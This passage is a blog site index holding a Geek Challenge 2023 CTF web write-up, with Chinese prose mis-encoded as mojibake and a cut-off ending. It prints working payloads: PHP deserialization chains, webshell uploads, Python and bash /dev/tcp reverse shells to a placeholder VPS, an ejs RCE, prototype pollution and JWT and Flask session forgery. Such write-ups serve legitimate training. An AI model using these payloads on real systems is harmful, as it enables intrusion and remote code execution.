{"meta":{"title":"Lazzaro","subtitle":"","description":"","author":"Lazzaro","url":"https://lazzzaro.github.io","root":"/"},"pages":[{"title":"åˆ†ç±»","date":"2020-05-06T11:36:47.000Z","updated":"2020-05-06T11:43:15.674Z","comments":true,"path":"categories/index.html","permalink":"https://lazzzaro.github.io/categories/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2020-05-06T11:36:23.000Z","updated":"2020-05-12T13:48:09.659Z","comments":true,"path":"tags/index.html","permalink":"https://lazzzaro.github.io/tags/index.html","excerpt":"","text":""},{"title":"å·¥å…·","date":"2020-05-06T11:40:16.000Z","updated":"2020-05-06T11:43:39.465Z","comments":true,"path":"links/index.html","permalink":"https://lazzzaro.github.io/links/index.html","excerpt":"","text":""},{"title":"ç•™è¨€æ¿","date":"2021-10-16T12:39:04.087Z","updated":"2020-05-21T14:14:51.458Z","comments":true,"path":"guestbook/index.html","permalink":"https://lazzzaro.github.io/guestbook/index.html","excerpt":"","text":""}],"posts":[{"title":"match-Geek Challenge 2023","slug":"match-Geek-Challenge-2023","date":"2023-11-27T10:28:02.000Z","updated":"2023-11-28T13:58:30.807Z","comments":true,"path":"2023/11/27/match-Geek-Challenge-2023/","permalink":"https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/","excerpt":"","text":"â€‹ ç¬¬åå››å±Šæå®¢å¤§æŒ‘æˆ˜ GEEK CHALLENGE 2023â€¼ï¸å¼€æ”¾æ³¨å†Œï¼š10æœˆ25æ—¥æ™š10ç‚¹æ¯”èµ›æ—¶é—´ï¼š10æœˆ26æ—¥æ™š8ç‚¹-11æœˆ26æ—¥æ™š8ç‚¹å¹³å°é“¾æ¥ï¼šhttps://game.sycsec.com/èµ›é¢˜èŒƒå›´åŒ…æ‹¬reï¼Œwebï¼Œpwnï¼Œcryptoï¼Œmiscç­‰ç­‰ï¼Œæœ¬å±Šèµ›é¢˜è¿˜åŠ å…¥å…¨æ–°yakè¯­è¨€å…ƒç´ ï¼Œæ–¹å‘å¤šæ ·ï¼Œè¶£å‘³æ€§é«˜ã€‚æœ¬å±Šæ›´å¢æ·»æ ¡å¤–æ’è¡Œæ¦œï¼Œæ ¡å¤–çš„åŒå­¦ä»¬ç»„é˜Ÿå‚ä¸ä¹Ÿèƒ½è·å¾—åæ¬¡å¥–åŠ±ï¼Œæ¬¢è¿å¤§å®¶å‰æ¥æŒ‘æˆ˜ ğŸ’ªã€‚ Rank: 4 WEBEzHttp httpç­¾åˆ°ï¼Œç‚¹å‡»å°±é€flag http://1.117.175.65:23333/ robots.txt è·å–è´¦å·å¯†ç ï¼Œå†æŒ‰æ­¥éª¤ç”¨å‡ ä¸ªè¯·æ±‚å¤´å­—æ®µç»•è¿‡ï¼š 1234567891011POST / HTTP/1.1Host: 1.117.175.65:23333User-Agent: SycloverReferer: sycsec.comX-Forwarded-For: 127.0.0.1via: Syc.vipO2TAKUXX: GiveMeFlagContent-Type: application/x-www-form-urlencodedContent-Length: 40username=admin&amp;password=@dm1N123456r00t# â€‹ unsign æ¥ç­¾ä¸ªåˆ°å§å…ˆ 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phphighlight_file(__FILE__);class syc&#123; public $cuit; public function __destruct() &#123; echo(&quot;action!&lt;br&gt;&quot;); $function=$this-&gt;cuit; return $function(); &#125;&#125;class lover&#123; public $yxx; public $QW; public function __invoke() &#123; echo(&quot;invoke!&lt;br&gt;&quot;); return $this-&gt;yxx-&gt;QW; &#125;&#125;class web&#123; public $eva1; public $interesting; public function __get($var) &#123; echo(&quot;get!&lt;br&gt;&quot;); $eva1=$this-&gt;eva1; $eva1($this-&gt;interesting); &#125;&#125;if (isset($_POST[&#x27;url&#x27;])) &#123; unserialize($_POST[&#x27;url&#x27;]);&#125;?&gt; ååºåˆ—åŒ–ï¼š 12345678910111213141516from phpserialize import serializeclass web: public_eva1=&#x27;system&#x27; public_interesting=&#x27;cat /f*&#x27; class lover: public_yxx=web() public_QW=&#x27;x&#x27; class syc: public_cuit=lover() print(serialize(syc()))# O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125; POSTï¼š url=O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125; â€‹ n00b_Uploadæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼šMIMEã€å›¾ç‰‡å¤´ã€ç»•å…³é”®å­— æ„é€ è¯·æ±‚å¤´ï¼š 123Content-Type: image/pngGIF89a&lt;?=system($_GET[x]); ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—® uploadtest/378845_653a63ea1370a.php?x=cat /flag æ‹¿flagã€‚ â€‹ easy_php å­¦äº†phpäº†ï¼Œé‚£å°±æ¥çœ‹çœ‹è¿™äº›ç»•è¿‡å§ 123456789101112131415161718192021222324252627282930&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__FILE__);include_once(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;syc&#x27;])&amp;&amp;preg_match(&#x27;/^Welcome to GEEK 2023!$/i&#x27;, $_GET[&#x27;syc&#x27;]) &amp;&amp; $_GET[&#x27;syc&#x27;] !== &#x27;Welcome to GEEK 2023!&#x27;) &#123; if (intval($_GET[&#x27;lover&#x27;]) &lt; 2023 &amp;&amp; intval($_GET[&#x27;lover&#x27;] + 1) &gt; 2024) &#123; if (isset($_POST[&#x27;qw&#x27;]) &amp;&amp; $_POST[&#x27;yxx&#x27;]) &#123; $array1 = (string)$_POST[&#x27;qw&#x27;]; $array2 = (string)$_POST[&#x27;yxx&#x27;]; if (sha1($array1) === sha1($array2)) &#123; if (isset($_POST[&#x27;SYC_GEEK.2023&#x27;])&amp;&amp;($_POST[&#x27;SYC_GEEK.2023&#x27;]=&quot;Happy to see you!&quot;)) &#123; echo $flag; &#125; else &#123; echo &quot;å†ç»•æœ€åä¸€æ­¥å§&quot;; &#125; &#125; else &#123; echo &quot;å¥½å“©ï¼Œå¿«æ‹¿åˆ°flagå•¦&quot;; &#125; &#125; else &#123; echo &quot;è¿™é‡Œç»•ä¸è¿‡å»ï¼ŒQWå¯ä¸ç­”åº”äº†å“ˆ&quot;; &#125; &#125; else &#123; echo &quot;å˜¿å˜¿å˜¿ï¼Œä½ åˆ«æ€¥å•Š&quot;; &#125;&#125;else &#123; echo &quot;ä¸ä¼šå§ä¸ä¼šå§ï¼Œä¸ä¼šç¬¬ä¸€æ­¥å°±å¡ä½äº†å§ï¼Œyxxä¼šç§ä¸èµ·ä½ çš„ï¼&quot;;&#125;?&gt; ç¬¬1å±‚ï¼šæ¢è¡Œç¬¦ç»•è¿‡ï¼› ç¬¬2å±‚ï¼šç§‘å­¦è®¡æ•°æ³•ç»• intval()ï¼› ç¬¬3å±‚ï¼šsha1ç¢°æ’ï¼› ç¬¬4å±‚ï¼šPHPè§£æç‰¹æ€§ã€‚ 123456POST /?syc=Welcome%20to%20GEEK%202023!%0a&amp;lover=2e5 HTTP/1.1Host: h2y55ia9rcbaswjlhegv0qonf.node.game.sycsec.comContent-Length: 1320Content-Type: application/x-www-form-urlencodedqw=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;yxx=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;SYC[GEEK.2023=Happy to see you! â€‹ ctf_curl å‘½ä»¤æ‰§è¡Œï¼ŸçœŸçš„å—ï¼Ÿ 1234567891011121314&lt;?phphighlight_file(&#x27;index.php&#x27;);// curl your domain// flag is in /tmp/Sycloverif (isset($_GET[&#x27;addr&#x27;])) &#123; $address = $_GET[&#x27;addr&#x27;]; if(!preg_match(&quot;/;|f|:|\\||\\&amp;|!|&gt;|&lt;|`|\\(|&#123;|\\?|\\n|\\r/i&quot;, $address))&#123; $result = system(&quot;curl &quot;.$address.&quot;&gt; /dev/null&quot;); &#125; else &#123; echo &quot;Hacker!!!&quot;; &#125;&#125;?&gt; åˆ©ç”¨VPSå’Œcurlå†™æ–‡ä»¶çš„å‚æ•°ï¼š ?addr=-O%201.php%20x.x.x.x/1.txt å…¶ä¸­ 1.txt å†…å®¹ä¸ºï¼š&lt;?php system(&quot;cat /tmp/Syclover&quot;);?&gt; è®¿é—® 1.php å¾—flagã€‚ â€‹ klf_ssti De1tyçš„å¹¿ä¸œæœ‹å‹è·Ÿå¥³ç¥è¡¨ç™½è¢«éª‚klfï¼Œç°åœ¨æ°”æ€¥è´¥åï¼Œä½ çŸ¥é“klfæ˜¯ä»€ä¹ˆæ„æ€å˜›ï¼Ÿä»–ç°åœ¨ä¾æ—§è§‰å¾—ä»–ä¸æ˜¯klfä½ ä»¬æ‰æ˜¯ï¼Œä½ èƒ½æ‹¿åˆ°flagè¯æ˜ä»–æ˜¯klfå˜›â€¦ è·¯ç”±ï¼š/hack?klf=xxx æ— è¿‡æ»¤ï¼Œä½†ä¹Ÿæ— è¾“å‡ºçš„SSTIç›²æ‰“ï¼Œåˆ©ç”¨pythonåå¼¹shellåˆ°VPSï¼š /hack?klf=&#123;%print(config.__class__.__init__.__globals__['os'].popen('python3 -c \\'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"x.x.x.x\",7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")\\' ').read())%&#125; åœ¨æ ¹ç›®å½•æ‹¿åˆ°flagã€‚ â€‹ ez_remove æˆ‘æƒ³è¦å›ç‚‰é‡é€ ä¸€æ³¢ï¼Œæ€ä¹ˆè¯´ï¼Œéš¾é“ä½ ä¸æƒ³å— 1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);class syc&#123; public $lover; public function __destruct() &#123; eval($this-&gt;lover); &#125;&#125;if(isset($_GET[&#x27;web&#x27;]))&#123; if(!preg_match(&#x27;/lover/i&#x27;,$_GET[&#x27;web&#x27;]))&#123; $a=unserialize($_GET[&#x27;web&#x27;]); throw new Error(&quot;å¿«æ¥ç©å¿«æ¥ç©~&quot;); &#125; else&#123; echo(&quot;nonono&quot;); &#125;&#125;?&gt; ååºåˆ—åŒ–ï¼Œç”¨ S ç»•å…³é”®å­—è¿‡æ»¤ï¼Œå»æœ€åå¤§æ‹¬å·ç»• Exceptionã€‚ å‘ç°è¯»ä¸å‡ºæ ¹ç›®å½•flagå€¼ï¼Œå­˜åœ¨open_basedirï¼Œåˆ©ç”¨ç»•è¿‡å‘½ä»¤è¯»ï¼š /?web=O:3:&quot;syc&quot;:1:&#123;S:5:&quot;\\6cover&quot;;s:142:&quot;mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);readgzfile(&#39;/f1ger&#39;);&quot;; â€‹ ez_path å¿«æ¥joinæˆ‘çš„åšå®¢å§ï¼ æºç æ³¨é‡Šï¼š&lt;!--secretåœ¨æ ¹ç›®å½•f14444æ–‡ä»¶é‡Œé¢ï¼Œåˆ«å¿˜è®°äº†--&gt;ã€‚ é¦–é¡µå¾—åˆ°æ³„éœ²çš„æ–‡ä»¶ app.cpython-39.pycï¼Œåç¼–è¯‘å¾—pythonæºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import os, uuidfrom flask import Flask, render_template, request, redirectapp = Flask(__name__)ARTICLES_FOLDER = &#x27;articles/&#x27;articles = []class Article: def __init__(self, article_id, title, content): self.article_id = article_id self.title = title self.content = contentdef generate_article_id(): return str(uuid.uuid4())@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;index.html&#x27;, articles=articles)@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload(): if request.method == &#x27;POST&#x27;: title = request.form[&#x27;title&#x27;] content = request.form[&#x27;content&#x27;] article_id = generate_article_id() article = Article(article_id, title, content) articles.append(article) save_article(article_id, title, content) return redirect(&#x27;/&#x27;) else: return render_template(&#x27;upload.html&#x27;)@app.route(&#x27;/article/&lt;article_id&gt;&#x27;)def article(article_id): for article in articles: if article.article_id == article_id: title = article.title sanitized_title = sanitize_filename(title) article_path = os.path.join(ARTICLES_FOLDER, sanitized_title) with open(article_path, &#x27;r&#x27;) as (file): content = file.read() return render_template(&#x27;articles.html&#x27;, title=sanitized_title, content=content, article_path=article_path) return render_template(&#x27;error.html&#x27;)def save_article(article_id, title, content): sanitized_title = sanitize_filename(title) article_path = ARTICLES_FOLDER + &#x27;/&#x27; + sanitized_title with open(article_path, &#x27;w&#x27;) as (file): file.write(content)def sanitize_filename(filename): sensitive_chars = [&#x27;:&#x27;, &#x27;*&#x27;, &#x27;?&#x27;, &#x27;&quot;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;|&#x27;, &#x27;.&#x27;] for char in sensitive_chars: filename = filename.replace(char, &#x27;_&#x27;) return filenameif __name__ == &#x27;__main__&#x27;: app.run(debug=True) åˆ©ç”¨ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´ï¼š os.path.join(path,*paths)å‡½æ•°ç”¨äºå°†å¤šä¸ªæ–‡ä»¶è·¯å¾„è¿æ¥æˆä¸€ä¸ªç»„åˆçš„è·¯å¾„ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°é€šå¸¸åŒ…å«äº†åŸºç¡€è·¯å¾„ï¼Œè€Œä¹‹åçš„æ¯ä¸ªå‚æ•°è¢«å½“ä½œç»„ä»¶æ‹¼æ¥åˆ°åŸºç¡€è·¯å¾„ä¹‹åã€‚ç„¶è€Œï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå°‘æœ‰äººçŸ¥çš„ç‰¹æ€§ï¼Œå¦‚æœæ‹¼æ¥çš„æŸä¸ªè·¯å¾„ä»¥ / å¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬åŸºç¡€è·¯å¾„åœ¨å†…çš„æ‰€æœ‰å‰ç¼€è·¯å¾„éƒ½å°†è¢«åˆ é™¤ï¼Œè¯¥è·¯å¾„å°†è§†ä¸ºç»å¯¹è·¯å¾„ã€‚ os.path.join(&#39;articles/&#39;,&#39;/f14444&#39;)=&#39;/f14444&#39; æ•…åœ¨ /upload è·¯ç”±ï¼ŒPOST title=/f14444&amp;content=qweï¼Œå³å¯æ‹¿åˆ°flagã€‚ â€‹ you konw flask? åœ¨é©¾æ ¡ä½ ä¸é«˜ä½å¾—å½“ä¸ªæ•™ç»ƒï¼Ÿ æ‰«æå‡º robots.txtï¼Œæ³„éœ²ä¿¡æ¯ï¼š3ysd8.htmlï¼Œæºç é‡Œæœ‰æ³¨é‡Šï¼š &lt;!-- keyæ˜¯ app.secret_key = &#39;wanbao&#39;+base64.b64encode(str(random.randint(1, 100)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)+&#39;wanbao&#39; (www,æˆ‘å¯çˆ±çš„è€å®,æˆ‘å­˜çš„å¤Ÿå®‰å…¨çš„å§) --&gt; åˆ¶ä½œçˆ†ç ´secret_keyçš„å­—å…¸ï¼š 123456import base64g = open(&#x27;dict.txt&#x27;,&#x27;wb&#x27;)for i in range(100): key = b&#x27;wanbao&#x27;+base64.b64encode(str(i).encode())+b&#x27;wanbao&#x27; g.write(key) g.write(b&#x27;\\n&#x27;) çˆ†ç ´flask sessionçš„secret_keyï¼š flask-unsign --unsign --cookie &#39;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ4eHgiLCJ1c2VyX2lkIjozfQ.ZUOYig.x1sFiE5HRT9q5bGAwSF6wMnZfOM&#39; --wordlist dict.txt å¾—åˆ°secret_keyåï¼Œä¼ªé€ adminçš„flask sessionï¼š flask-unsign --sign --cookie &quot;&#123;&#39;is_admin&#39;: True, &#39;name&#39;: &#39;xxx&#39;, &#39;user_id&#39;: 3&#125;&quot; --secret &#39;wanbaoNTc=wanbao&#39; è¿›å…¥å­¦å‘˜ç®¡ç†é¡µé¢ï¼Œæ‰¾åˆ°flagï¼š æ—¢ç„¶ä½ æ˜¯æ•™ç»ƒï¼Œé‚£è¿™ä¸ªflagå­¦å‘˜å°±äº¤ç»™ä½ å§ SYC&#123;naCcuTYu2mu0c33Fen&#125; â€‹ Pupyy_rce è¿™æ˜¯ä»€ä¹ˆï¼Ÿæ‰§è¡Œä¸€ä¸‹ 123456789101112131415161718&lt;?phphighlight_file(__FILE__);header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);error_reporting(0);include(flag.php);//å½“å‰ç›®å½•ä¸‹æœ‰å¥½åº·çš„ğŸ˜‹if (isset($_GET[&#x27;var&#x27;]) &amp;&amp; $_GET[&#x27;var&#x27;]) &#123; $var = $_GET[&#x27;var&#x27;]; if (!preg_match(&quot;/env|var|session|header/i&quot;, $var,$match)) &#123; if (&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $var))&#123; eval($_GET[&#x27;var&#x27;]); &#125; else die(&quot;WAF!!&quot;); &#125; else&#123; die(&quot;PLZ DONT HCAK MEğŸ˜…&quot;); &#125;&#125; æ— å‚æ•°RCEï¼š?var=print_r(scandir(current(localeconv()))); å¾—åˆ°ï¼š Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; error.log [3] =&gt; fl@g.php [4] =&gt; genshin01.txt [5] =&gt; index.php [6] =&gt; tiangou01.txt [7] =&gt; tiangou02.txt ) è®¿é—® fl@g.php å¾—flagã€‚ â€‹ é›¨ VanZYç»™ç™½æœˆå…‰å†™äº†ä¸€å¼ æ˜ä¿¡ç‰‡ï¼Œå¿«å»å¸®ä»–æŠŠidç­¾ä¸Šå§ è®¿é—® /source æ²¡æƒé™ï¼Œæç¤º &lt;!--Maybe you can view /hint--&gt;ã€‚ è®¿é—® /hintï¼Œæç¤º I heard that the challenge maker likes to use his own id as secret_keyã€‚ ä½¿ç”¨jwt.ioè§£æjwtï¼Œè®¾ç½®secret_key=VanZYï¼Œå¾—åˆ° /source æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677const express = require(&#x27;express&#x27;);const jwt = require(&#x27;jsonwebtoken&#x27;);const app = express();const bodyParser = require(&#x27;body-parser&#x27;)const path = require(&#x27;path&#x27;);const jwt_secret = &quot;VanZY&quot;;const cookieParser = require(&#x27;cookie-parser&#x27;);const putil_merge = require(&quot;putil-merge&quot;)app.set(&#x27;views&#x27;, &#x27;./views&#x27;);app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.use(cookieParser());app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())var Super = &#123;&#125;;var safecode = function (code)&#123; let validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\\+|\\*/ig; return !validInput.test(code);&#125;;app.all(&#x27;/code&#x27;, (req, res) =&gt; &#123; res.type(&#x27;html&#x27;); if (req.method == &quot;POST&quot; &amp;&amp; req.body) &#123; putil_merge(&#123;&#125;, req.body, &#123;deep:true&#125;); &#125; res.send(&quot;welcome to code&quot;);&#125;);app.all(&#x27;/hint&#x27;, (req, res) =&gt; &#123; res.type(&#x27;html&#x27;); res.send(&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;);&#125;);app.get(&#x27;/source&#x27;, (req, res) =&gt; &#123; res.type(&#x27;html&#x27;); var auth = req.cookies.auth; jwt.verify(auth, jwt_secret , function(err, decoded) &#123; try&#123; if(decoded.user===&#x27;admin&#x27;)&#123; res.sendFile(path.join(__dirname + &#x27;/index.js&#x27;)); &#125;else&#123; res.send(&#x27;you are not admin &lt;!--Maybe you can view /hint--&gt;&#x27;); &#125; &#125; catch&#123; res.send(&quot;Fuck you Hacker!!!&quot;) &#125; &#125;);&#125;);app.all(&#x27;/create&#x27;, (req, res) =&gt; &#123; res.type(&#x27;html&#x27;); if (!req.body.name || req.body.name === undefined || req.body.name === null)&#123; res.send(&quot;please input name&quot;); &#125;else &#123; if (Super[&#x27;userrole&#x27;] === &#x27;Superadmin&#x27;) &#123; res.render(&#x27;index&#x27;, req.body); &#125;else &#123; if (!safecode(req.body.name)) &#123; res.send(&quot;ä½ åœ¨åšä»€ä¹ˆï¼Ÿå¿«åœä¸‹ï¼ï¼ï¼&quot;) &#125; else&#123; res.render(&#x27;index&#x27;, &#123;name: req.body.name&#125;); &#125; &#125; &#125;&#125;);app.get(&#x27;/&#x27;,(req, res) =&gt; &#123; res.type(&#x27;html&#x27;); var token = jwt.sign(&#123;&#x27;user&#x27;:&#x27;guest&#x27;&#125;,jwt_secret,&#123; algorithm: &#x27;HS256&#x27; &#125;); res.cookie(&#x27;auth &#x27;,token); res.end(&#x27;Only admin can get source in /source&#x27;);&#125;);app.listen(3000, () =&gt; console.log(&#x27;Server started on port 3000&#x27;)); åœ¨ /code è·¯ç”±ä¸­ä½¿ç”¨äº† putil_merge() ï¼Œç»“åˆputil-mergeåŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼ˆCVE-2021-23470ï¼‰ï¼Œå°† Super æ±¡æŸ“ï¼Œä½¿å¾— /create è·¯ç”±å†…çš„ Super[&#39;userrole&#39;] === &#39;Superadmin&#39; æˆç«‹ï¼š 1234POST /codeContent-Type: application/json&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;userrole&quot;:&quot;Superadmin&quot;&#125;&#125;&#125; è¿›å…¥ /create è·¯ç”±å†…ï¼Œæ‰“ejs RCEï¼ˆCVE-2022-29078ï¼‰ï¼Œå‚è€ƒï¼šejs RCE CVE-2022-29078 bypassã€‚ 1234567891011POST /create HTTP/1.1Content-Type: application/json&#123;&quot;name&quot;:&quot;xxx&quot;, &quot;settings&quot;:&#123; &quot;view options&quot;:&#123; &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require(\\&quot;child_process\\&quot;).execSync(\\&quot;bash -c \\\\\\&quot;bash -i &gt; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1 2&gt;&amp;1\\\\\\&quot;\\&quot;);&quot;, &quot;client&quot;:&quot;true&quot; &#125; &#125;&#125; åå¼¹shellï¼Œåœ¨VPS getshellï¼Œcat /Yupr0m1sing_f1ll4agggXD å¾—åˆ°flagï¼šSYC&#123;Chun_a1_M4n_NeVer_G1ve_Up&#125;ã€‚ â€‹ famale_imp_l0ve â€é›Œå°é¬¼çœ‹äº†ä¸‹o2takuXXå¸ˆå‚…çš„é©¬å­è¯´:â€å‘~å°±..å°±æ€ä¹ˆé•¿å—ï¼ŒçœŸæ˜¯æ‚é±¼å‘¢~â¤â€,ä½ èƒ½æ¥å¸®å¸®ä»–å—ï¼Ÿ æ ¹æ®æºç æ³¨é‡Šï¼Œå­˜åœ¨ include.php æ–‡ä»¶ï¼š 123456789&lt;?php//o2takuXXå¸ˆå‚…è¯´æœ‰é—®é¢˜ï¼Œå¿˜çœ‹äº†ã€‚header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);highlight_file(__FILE__);$file = $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;)&#123; include($file);&#125;?&gt; ç»“åˆé¦–é¡µæ–‡ä»¶ä¸Šä¼ å’Œå‹ç¼©çš„æç¤ºï¼Œè€ƒå¯Ÿzipæ–‡ä»¶åŒ…å«ã€‚ é¦–å…ˆæ–°å»ºä¸€ä¸ªzipæ–‡ä»¶ï¼Œé‡Œé¢å‹ç¼©ç€ä¸€ä¸ªä»£ç ä¸º &lt;?php system($_GET[x]); çš„PHPè„šæœ¬ï¼›ç„¶åæ„é€  zip://php.zip#php.jpgï¼š /include.php?file=zip://php.zip%23php.jpg&amp;x=cat /flag å³å¯å¾—åˆ°flagã€‚ â€‹ change_it å¿«æ¥æ‰¾flagï¼ï¼ˆæ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ä¸º â€œ/uploadâ€ï¼‰ æŸ¥çœ‹æºä»£ç å¾—åˆ°ç”¨æˆ·åå¯†ç  user/userï¼Œå…¶ä¸­æœ‰ï¼š 1234567891011121314151617&lt;!-- ä¸€ç›´è¿ä¸ä¸Šï¼Ÿè¿ä¸ä¸Šå°±å¯¹å•¦ï¼ --&gt; &lt;!-- phpç‰ˆæœ¬ä¸º8.0 function php_mt_seed($seed) &#123; mt_srand($seed); &#125; $seed = time(); php_mt_seed($seed); $characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $newFileName = &#x27;&#x27;; for ($i = 0; $i &lt; 10; $i++) &#123; $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; &#125; --&gt; jwtä¼ªé€ ï¼Œçˆ†ç ´c-jwt-crackerï¼š ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4 å¾—åˆ° Secret is &quot;yibao&quot; æ„é€  &#123;&quot;iss&quot;: &quot;Qingwan&quot;,&quot;name&quot;: &quot;admin&quot;,&quot;admin&quot;: &quot;true&quot;&#125; å¯¹åº”çš„JWTï¼š eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek æ ¹æ®å‰é¢ change.html æºç æ³„éœ²çš„ php_mt_seed() å‡½æ•°çŸ¥æ–‡ä»¶åé€šè¿‡éšæœºæ•°æ›´æ”¹ï¼ŒæŠ“åŒ…ï¼Œæ”¹æ–‡ä»¶åä¸º1.phpï¼š 123456POST /change.php HTTP/1.1------WebKitFormBoundaryLjuFMGS9hc3RMksxContent-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;1.php&quot;Content-Type: image/jpeg&lt;?php system(&quot;cat /flag&quot;); ä¸Šä¼ ï¼ŒåŒæ—¶çˆ†ç ´æ–‡ä»¶åï¼šhttps://3v4l.org/UvLQQ#v8.0.30 1234567891011121314151617181920&lt;?phpfunction php_mt_seed($seed)&#123; mt_srand($seed);&#125;$x = time();for($k=-20;$k&lt;20;$k++) &#123; $seed = $x+$k; php_mt_seed($seed); $characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $newFileName = &#x27;&#x27;; for ($i = 0; $i &lt; 10; $i++) &#123; $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; &#125; echo $newFileName.&#x27;|&#x27;;&#125; å¾—åˆ°çš„æ–‡ä»¶åï¼Œçˆ†ç ´å…¶å­˜åœ¨æ€§ï¼š 123456789101112import requestsrand = 